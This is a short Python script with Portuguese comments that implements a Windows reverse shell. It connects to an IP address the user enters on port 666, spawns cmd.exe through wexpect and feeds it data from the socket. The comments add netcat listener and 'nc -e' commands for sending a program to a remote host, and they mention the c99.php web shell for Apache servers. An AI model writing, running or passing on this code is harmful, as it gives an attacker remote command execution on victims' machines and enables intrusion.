#Abrir porta: nc -lvp porta
#conectar e enviar um programa através de conexão: nc -e "caminho" ip porta


#c99.php arquivo que permiter criar uma web shell em um servidor web apache. 
#Executar um processo base Windows
#import subprocess
#subprocess.run('cmd.exe')
import socket
import wexpect

s = socket.socket()
ip = input('Informe o IP: ')
try:
    s.connect((ip, 666))
    s.settimeout(5)
except Exception as e:
    print(f"Error connecting to {ip}: {str(e)}")
    exit()
try:
    shell = wexpect.spawn('cmd.exe')
    shell.logfile = s

    while True:
        try:
            data = s.recv(1024)
            if not data:
                    break
            shell.send(data)
        except socket.error as e:
            print(e)
            break
except Exception as e:
     print(f"Error executing cmd.exe with wexpect: {str(e)}")
     exit()
